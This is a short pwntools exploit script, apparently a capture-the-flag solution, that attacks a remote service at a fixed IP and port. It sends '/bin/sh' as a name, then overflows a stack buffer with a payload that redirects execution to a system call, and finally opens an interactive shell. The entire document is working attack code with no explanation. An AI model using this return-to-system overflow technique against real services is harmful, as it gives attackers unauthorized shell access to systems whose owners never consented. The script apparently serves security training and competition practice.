from pwn import *

context.log_level = 'DEBUG'

# p = process('../file/53c24fc5522e4a8ea2d9ad0577196b2f')
p = remote('61.147.171.105', '65494')

input('continue?')

system_plt = 0x08048420
system_call = 0x804855a
payload = b'a' * (0x26 + 4) + p32(system_call) + p32(0x0804a080)
# payload = b'a' * (0x26 + 4) + p32(system_plt) + p32(0) + p32(0x0804a080)

p.sendlineafter(b'name\n', '/bin/sh')
p.sendlineafter(b'here:\n', payload)

p.interactive()